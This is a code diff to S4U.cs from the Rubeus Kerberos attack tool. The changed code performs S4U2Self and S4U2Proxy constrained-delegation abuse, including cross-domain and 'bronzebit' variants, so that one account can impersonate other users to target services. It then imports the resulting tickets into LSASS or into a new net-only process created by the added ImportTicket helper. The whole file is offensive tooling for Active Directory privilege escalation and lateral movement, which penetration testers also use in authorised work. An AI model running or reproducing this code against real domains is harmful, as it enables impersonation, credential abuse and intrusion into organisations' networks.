@@ -1,17 +1,14 @@
-﻿using System;
-using System.IO;
-using System.Linq;
-using System.Net;
-using System.Collections.Generic;
-using Asn1;
+﻿using Asn1;
 using Rubeus.lib.Interop;
+using System;
+using System.Net;
 
 
 namespace Rubeus
 {
     public class S4U
     {
-        public static void Execute(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "", bool self = false, bool opsec = false, bool bronzebit = false, bool pac = true, string proxyUrl = null)
+        public static void Execute(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "", bool self = false, bool opsec = false, bool bronzebit = false, bool pac = true, string proxyUrl = null, string createnetonly = null, bool show = false)
         {
             // first retrieve a TGT for the user
             byte[] kirbiBytes = Ask.TGT(userName, domain, keyString, etype, null, false, domainController, new LUID(), false, opsec, "", false, pac, proxyUrl);
@@ -30,9 +27,9 @@ namespace Rubeus
             KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
 
             // execute the s4u process
-            Execute(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, tgs, targetDomainController, targetDomain, self, opsec, bronzebit, keyString, etype, null, null, proxyUrl);
+            Execute(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, tgs, targetDomainController, targetDomain, self, opsec, bronzebit, keyString, etype, null, null, proxyUrl, createnetonly, show);
         }
-        public static void Execute(KRB_CRED kirbi, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "", bool s = false, bool opsec = false, bool bronzebit = false, string keyString = "", Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial, string requestDomain = "", string impersonateDomain = "", string proxyUrl = null)
+        public static void Execute(KRB_CRED kirbi, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "", bool s = false, bool opsec = false, bool bronzebit = false, string keyString = "", Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial, string requestDomain = "", string impersonateDomain = "", string proxyUrl = null, string createnetonly = null, bool show = false)
         {
             Console.WriteLine("[*] Action: S4U\r\n");
 
@@ -41,14 +38,14 @@ namespace Rubeus
                 // do cross domain S4U
                 // no support for supplying a TGS due to requiring more than a single ticket
                 Console.WriteLine("[*] Performing cross domain constrained delegation");
-                CrossDomainS4U(kirbi, targetUser, targetSPN, ptt, domainController, altService, targetDomainController, targetDomain);
+                CrossDomainS4U(kirbi, targetUser, targetSPN, ptt, domainController, altService, targetDomainController, targetDomain, createnetonly, show);
             }
             else
             {
                 if (tgs != null && String.IsNullOrEmpty(targetSPN) == false)
                 {
                     Console.WriteLine("[*] Loaded a TGS for {0}\\{1}", tgs.enc_part.ticket_info[0].prealm, tgs.enc_part.ticket_info[0].pname.name_string[0]);
-                    S4U2Proxy(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, tgs, opsec, proxyUrl);
+                    S4U2Proxy(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, tgs, opsec, proxyUrl, createnetonly, show);
                 }
                 else
                 {
@@ -75,7 +72,7 @@ namespace Rubeus
                     }
                     else
                     {
-                        self = S4U2Self(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, s, opsec, bronzebit, keyString, encType, proxyUrl);
+                        self = S4U2Self(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, s, opsec, bronzebit, keyString, encType, proxyUrl, createnetonly, show);
                         if (self == null)
                         {
                             Console.WriteLine("[X] S4U2Self failed, unable to perform S4U2Proxy.");
@@ -84,12 +81,13 @@ namespace Rubeus
                     }
                     if (String.IsNullOrEmpty(targetSPN) == false)
                     {
-                        S4U2Proxy(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, self, opsec, proxyUrl);
+                        S4U2Proxy(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, self, opsec, proxyUrl, createnetonly, show);
                     }
                 }
             }
         }
-        private static void S4U2Proxy(KRB_CRED kirbi, string targetUser, string targetSPN, string outfile, bool ptt, string domainController = "", string altService = "", KRB_CRED tgs = null, bool opsec = false, string proxyUrl = null)
+
+        private static void S4U2Proxy(KRB_CRED kirbi, string targetUser, string targetSPN, string outfile, bool ptt, string domainController = "", string altService = "", KRB_CRED tgs = null, bool opsec = false, string proxyUrl = null, string createnetonly = null, bool show = false)
         {
             Console.WriteLine("[*] Impersonating user '{0}' to target SPN '{1}'", targetUser, targetSPN);
             if (!String.IsNullOrEmpty(altService))
@@ -334,7 +332,7 @@ namespace Rubeus
                         if (ptt)
                         {
                             // pass-the-ticket -> import into LSASS
-                            LSA.ImportTicket(kirbiBytes, new LUID());
+                            ImportTicket(kirbiBytes, createnetonly, show);
                         }
                     }
                 }
@@ -423,7 +421,7 @@ namespace Rubeus
                     if (ptt)
                     {
                         // pass-the-ticket -> import into LSASS
-                        LSA.ImportTicket(kirbiBytes, new LUID());
+                        ImportTicket(kirbiBytes, createnetonly, show);
                     }
                 }
             }
@@ -438,7 +436,8 @@ namespace Rubeus
                 Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
             }
         }
-        private static KRB_CRED S4U2Self(KRB_CRED kirbi, string targetUser, string targetSPN, string outfile, bool ptt, string domainController = "", string altService = "", bool self = false, bool opsec = false, bool bronzebit = false, string keyString = "", Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial, string proxyUrl = null)
+        
+        private static KRB_CRED S4U2Self(KRB_CRED kirbi, string targetUser, string targetSPN, string outfile, bool ptt, string domainController = "", string altService = "", bool self = false, bool opsec = false, bool bronzebit = false, string keyString = "", Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial, string proxyUrl = null, string createnetonly = null, bool show = false)
         {
             // extract out the info needed for the TGS-REQ/S4U2Self execution
             string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
@@ -605,7 +604,7 @@ namespace Rubeus
                 if (ptt && self)
                 {
                     // pass-the-ticket -> import into LSASS
-                    LSA.ImportTicket(kirbiBytes, new LUID());
+                    ImportTicket(kirbiBytes, createnetonly, show);
                 }
 
                 return cred;
@@ -624,7 +623,7 @@ namespace Rubeus
             return null;
         }
 
-        private static void CrossDomainS4U(KRB_CRED kirbi, string targetUser, string targetSPN, bool ptt, string domainController = "", string altService = "", string targetDomainController = "", string targetDomain = "")
+        private static void CrossDomainS4U(KRB_CRED kirbi, string targetUser, string targetSPN, bool ptt, string domainController = "", string altService = "", string targetDomainController = "", string targetDomain = "", string createnetonly = null, bool show = false)
         {
             // extract out the info needed for the TGS-REQ/S4U2Self execution
             string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
@@ -674,7 +673,7 @@ namespace Rubeus
         }
 
         // to perform the 2 S4U2Self requests
-        private static KRB_CRED CrossDomainS4U2Self(string userName, string targetUser, string targetDomainController, Ticket ticket, byte[] clientKey, Interop.KERB_ETYPE etype, Interop.KERB_ETYPE requestEType, bool cross = true, string altService = "", bool self = false, string requestDomain = "", bool ptt = false)
+        private static KRB_CRED CrossDomainS4U2Self(string userName, string targetUser, string targetDomainController, Ticket ticket, byte[] clientKey, Interop.KERB_ETYPE etype, Interop.KERB_ETYPE requestEType, bool cross = true, string altService = "", bool self = false, string requestDomain = "", bool ptt = false, string createnetonly = null, bool show = false)
         {
             // die if can't get IP of DC
             string dcIP = Networking.GetDCIP(targetDomainController);
@@ -778,7 +777,7 @@ namespace Rubeus
                 if (ptt)
                 {
                     // pass-the-ticket -> import into LSASS
-                    LSA.ImportTicket(kirbiBytes, new LUID());
+                    ImportTicket(kirbiBytes, createnetonly, show);
                 }
 
                 return kirbi;
@@ -797,7 +796,7 @@ namespace Rubeus
         }
 
         // to perform the 2 S4U2Proxy requests
-        private static KRB_CRED CrossDomainS4U2Proxy(string userName, string targetUser, string targetSPN, string targetDomainController, Ticket ticket, byte[] clientKey, Interop.KERB_ETYPE etype, Interop.KERB_ETYPE requestEType, Ticket tgs = null, bool cross = true, bool ptt = false)
+        private static KRB_CRED CrossDomainS4U2Proxy(string userName, string targetUser, string targetSPN, string targetDomainController, Ticket ticket, byte[] clientKey, Interop.KERB_ETYPE etype, Interop.KERB_ETYPE requestEType, Ticket tgs = null, bool cross = true, bool ptt = false, string createnetonly = null, bool show = false)
         {
             string dcIP = Networking.GetDCIP(targetDomainController);
             if (String.IsNullOrEmpty(dcIP)) { return null; }
@@ -938,7 +937,7 @@ namespace Rubeus
                 if (ptt && cross)
                 {
                     // pass-the-ticket -> import into LSASS
-                    LSA.ImportTicket(kirbiBytes, new LUID());
+                    ImportTicket(kirbiBytes, createnetonly, show);
                 }
 
                 KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
@@ -979,6 +978,18 @@ namespace Rubeus
                 Console.WriteLine("      {0}", kirbiString);
             }
             Console.WriteLine("");
+        }
+
+        private static void ImportTicket(byte[] kirbiBytes, string createnetonly, bool show)
+        {
+            if (!string.IsNullOrEmpty(createnetonly))
+            {
+                Helpers.CreateProcessNetOnly(createnetonly, show, kirbiBytes: kirbiBytes);
+            }
+            else
+            {
+                LSA.ImportTicket(kirbiBytes, new LUID());
+            }
         }
     }
 }
